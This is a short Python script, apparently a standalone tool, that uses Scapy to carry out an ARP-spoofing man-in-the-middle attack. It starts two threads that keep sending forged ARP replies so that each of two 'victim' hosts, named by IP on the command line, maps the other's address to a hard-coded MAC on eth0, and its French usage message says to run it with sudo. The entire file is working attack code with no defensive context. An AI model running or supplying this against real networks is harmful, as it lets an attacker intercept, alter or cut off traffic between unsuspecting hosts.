from scapy.all import ARP, send
import sys
import time
import threading

def arpSpoof(targetIp, spoofIp):
    while True:
        arpResponse = ARP(op=2, pdst=targetIp, psrc=spoofIp, hwsrc="08:00:27:1e:36:4a")
        send(arpResponse, iface="eth0", verbose=1)
        time.sleep(2)

def main(victim1Ip, victim2Ip):
    thread1 = threading.Thread(target=arpSpoof, args=(victim1Ip, victim2Ip))
    thread2 = threading.Thread(target=arpSpoof, args=(victim2Ip, victim1Ip))
    thread1.start()
    thread2.start()

    thread1.join()
    thread2.join()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Utilisation : sudo python3 arp_spoof.py [IP victime 1] [IP victime 2]")
        sys.exit(1)

    victim1Ip = sys.argv[1]
    victim2Ip = sys.argv[2]

    main(victim1Ip, victim2Ip)
